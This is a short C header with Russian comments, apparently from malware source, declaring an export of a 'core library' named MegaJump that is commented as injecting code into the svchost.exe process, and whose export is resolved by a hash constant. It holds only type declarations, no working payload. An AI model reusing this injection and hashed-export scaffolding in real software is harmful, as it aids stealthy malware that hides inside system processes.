
//------------------------------------------------------------
//   Модуль объвлений библиотеки ядра CoreDlll.dll
//------------------------------------------------------------

typedef DWORD (WINAPI *TInjectFunc)(LPVOID);

//=============================================
//  Прототипы функций
//=============================================

// Функция инжектав процесс svchost.exe
typedef BOOL (WINAPI *TMegaJump)(TInjectFunc Function);




//=============================================
//  Хэши экспортируемых функций
//=============================================
#define COREDLL_MEGAJUMP 0x19C6E1CE /* MegaJump */
